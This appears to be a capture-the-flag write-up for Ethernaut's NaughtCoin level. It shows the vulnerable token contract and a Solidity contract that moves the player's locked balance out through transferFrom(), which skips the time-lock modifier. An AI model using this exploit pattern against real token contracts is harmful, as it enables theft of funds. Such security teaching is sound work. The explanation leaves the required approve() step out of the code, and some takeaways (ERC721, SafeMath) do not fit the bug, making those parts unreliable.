# Ethernaut Level 15: NaughtCoin Exploit

In this level, the NaughtCoin token has a vulnerability due to poor implementation. The exploit is carried out by bypassing the lockTokens modifier and successfully moving the tokens using the combination of approve() and transferFrom() functions.

## NaughtCoin Contract Overview

The NaughtCoin contract is implemented using OpenZeppelin's ERC20 contract. It has a timeLock preventing the player from transferring tokens until the timeLock expires.

```solidity
contract NaughtCoin is ERC20 {
    ...
    uint public timeLock = block.timestamp + 10 * 365 days;
    ...
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

# Hack Contract Overview

The Hack contract interacts with the NaughtCoin contract and exploits the vulnerability by bypassing the lockTokens modifier.

```solidity
contract Hack {
    function pwn(IERC20 coin) external {
        address player = INaughtCoin(address(coin)).player();
        uint256 bal = coin.balanceOf(player);
        coin.transferFrom(player, address(this), bal);
    }
}
```

## Exploit Explanation

1. The Hack contract retrieves the player's address and balance using the balanceOf() function.
2. It then calls the transferFrom() function, which allows the Hack contract to transfer the player's entire token balance to itself, bypassing the lockTokens modifier.

The exploit works because the transferFrom() function in the NaughtCoin contract does not have the lockTokens modifier, which was intended to prevent the player from transferring tokens before the timeLock expires.

## Key Takeaways for Smart Contract Security

1. Make sure to implement all available functions when interfacing with contracts or implementing an ERC interface.
2. Consider using newer protocols like ERC223, ERC721, and ERC827 when creating your own tokens.
3. Check for EIP 165 compliance to confirm which interface an external contract is implementing.
4. Use SafeMath to prevent token under/overflows.
